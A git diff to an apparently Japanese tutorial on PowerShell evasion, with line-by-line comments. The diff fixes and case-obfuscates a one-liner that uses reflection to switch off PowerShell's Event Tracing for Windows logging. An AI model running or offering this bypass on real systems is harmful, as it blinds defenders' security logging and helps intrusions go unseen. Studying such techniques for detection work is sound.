@@ -235,7 +235,7 @@ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 
 また、ETX(Event Tracing for Windows)を無効にする
 ```powershell
-# [Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPUbliC,Instance").SetValue([ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")).GetField("etwProvider","NonPUbliC,StATIc").GetValue($irKIwf1Nj0k3B9gk),0)
+# [Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetFIeLD("m_enabled","NOnPUBLIC,Instance").SetValue([ReF].AsSEMBLY.GEtTyPe("System.Management.Automation.Tracing.PSEtwLogProvider").GetFIeLD("etwProvider","NOnPUBLIC,StATIc").GETVALue($XCg4haX2thXmkYPuR),0) 
 # [Reflection.Assembly]::LoadWithPartialName("System.Core")で、アセンブリ「System.Core.dll」をロード
 # .GetType("System.Diagnostics.Eventing.EventProvider")で、EventProviderクラスを取得
 # .GetField("m_enabled","NonPUbliC,Instance")で、EventProviderクラスの「m_enabled」フィールドを取得
